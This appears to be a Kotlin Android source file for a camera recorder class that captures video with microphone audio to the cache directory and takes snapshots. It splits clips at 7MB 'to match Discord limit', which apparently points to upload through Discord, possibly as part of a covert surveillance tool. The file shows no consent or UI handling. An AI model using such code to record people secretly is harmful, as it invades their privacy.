package com.example.dronzer

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import java.io.File

class CameraRecorder(
    private val context: Context,
    private val onMaxLimitReached: (File) -> Unit,
    private val onInterrupted: (File) -> Unit
) {
    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var mediaRecorder: MediaRecorder? = null
    private var imageReader: ImageReader? = null
    private var videoFile: File? = null
    private var isRecording = false
    private var isStarted = false
    private var handlerThread: HandlerThread? = null
    private var handler: Handler? = null
    private var currentFront: Boolean = true

    @SuppressLint("MissingPermission")
    fun startRecording(front: Boolean): File? {
        if (isRecording) return null
        currentFront = front
        
        val manager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        try {
            val cameraId = manager.cameraIdList.find { id ->
                val chars = manager.getCameraCharacteristics(id)
                val facing = chars.get(CameraCharacteristics.LENS_FACING)
                if (front) facing == CameraCharacteristics.LENS_FACING_FRONT
                else facing == CameraCharacteristics.LENS_FACING_BACK
            } ?: return null

            isRecording = true
            handlerThread = HandlerThread("CameraRecorderThread").apply { start() }
            handler = Handler(handlerThread!!.looper)

            videoFile = File(context.cacheDir, "rec_cam_${System.currentTimeMillis()}.mp4")
            
            setupMediaRecorder()
            
            imageReader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 2)

            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    startCaptureSession()
                }
                override fun onDisconnected(camera: CameraDevice) {
                    Log.w("CameraRecorder", "Camera disconnected (likely taken by another app)")
                    stopRecording()?.let { onInterrupted(it) }
                }
                override fun onError(camera: CameraDevice, error: Int) {
                    Log.e("CameraRecorder", "Camera error: $error")
                    stopRecording()?.let { onInterrupted(it) }
                }
            }, handler)

            return videoFile
        } catch (e: Exception) {
            Log.e("CameraRecorder", "Start failed: ${e.message}")
            stopRecording()
            return null
        }
    }

    private fun setupMediaRecorder() {
        mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(context)
        } else {
            @Suppress("DEPRECATION")
            MediaRecorder()
        }

        mediaRecorder?.apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setVideoSource(MediaRecorder.VideoSource.SURFACE)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setOutputFile(videoFile?.absolutePath)
            setVideoEncoder(MediaRecorder.VideoEncoder.H264)
            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            
            setVideoEncodingBitRate(5_000_000)
            setVideoFrameRate(60)
            setVideoSize(1280, 720)
            
            // Set max file size to 7MB to match Discord limit
            setMaxFileSize(7 * 1024 * 1024)
            
            setOnInfoListener { _, what, _ ->
                if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_FILESIZE_REACHED) {
                    Log.d("CameraRecorder", "Max file size reached, splitting...")
                    stopRecording()?.let { onMaxLimitReached(it) }
                }
            }
            
            setOnErrorListener { _, what, extra ->
                Log.e("CameraRecorder", "MediaRecorder error: $what, $extra")
                stopRecording()?.let { onInterrupted(it) }
            }
            
            prepare()
        }
    }

    private fun startCaptureSession() {
        val recorderSurface = mediaRecorder?.surface ?: return
        val readerSurface = imageReader?.surface ?: return
        
        cameraDevice?.createCaptureSession(listOf(recorderSurface, readerSurface), object : CameraCaptureSession.StateCallback() {
            override fun onConfigured(session: CameraCaptureSession) {
                captureSession = session
                try {
                    val builder = cameraDevice?.createCaptureRequest(CameraDevice.TEMPLATE_RECORD)
                    builder?.addTarget(recorderSurface)
                    session.setRepeatingRequest(builder!!.build(), null, handler)
                    mediaRecorder?.start()
                    isStarted = true
                } catch (e: Exception) {
                    Log.e("CameraRecorder", "Session failed: ${e.message}")
                    stopRecording()?.let { onInterrupted(it) }
                }
            }
            override fun onConfigureFailed(session: CameraCaptureSession) {
                stopRecording()?.let { onInterrupted(it) }
            }
        }, handler)
    }

    fun takeSnapshot(onCapture: (ByteArray) -> Unit) {
        val session = captureSession ?: return
        val reader = imageReader ?: return
        val device = cameraDevice ?: return
        
        try {
            reader.setOnImageAvailableListener({ r ->
                val image = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                val buffer = image.planes[0].buffer
                val bytes = ByteArray(buffer.remaining())
                buffer.get(bytes)
                image.close()
                onCapture(bytes)
                reader.setOnImageAvailableListener(null, null)
            }, handler)

            val builder = device.createCaptureRequest(CameraDevice.TEMPLATE_VIDEO_SNAPSHOT)
            builder.addTarget(reader.surface)
            session.capture(builder.build(), null, handler)
        } catch (e: Exception) {
            Log.e("CameraRecorder", "Snapshot error: ${e.message}")
        }
    }

    fun stopRecording(): File? {
        if (!isRecording && !isStarted) return null
        isRecording = false
        
        try {
            if (isStarted) {
                mediaRecorder?.stop()
            }
        } catch (e: Exception) {
            Log.e("CameraRecorder", "Stop error: ${e.message}")
        }
        
        mediaRecorder?.release()
        mediaRecorder = null
        imageReader?.close()
        imageReader = null
        captureSession?.close()
        captureSession = null
        cameraDevice?.close()
        cameraDevice = null
        handlerThread?.quitSafely()
        handlerThread = null
        isStarted = false
        
        val result = videoFile
        videoFile = null
        return if (result?.exists() == true && result.length() > 0) result else null
    }

    fun isRecording() = isRecording
}
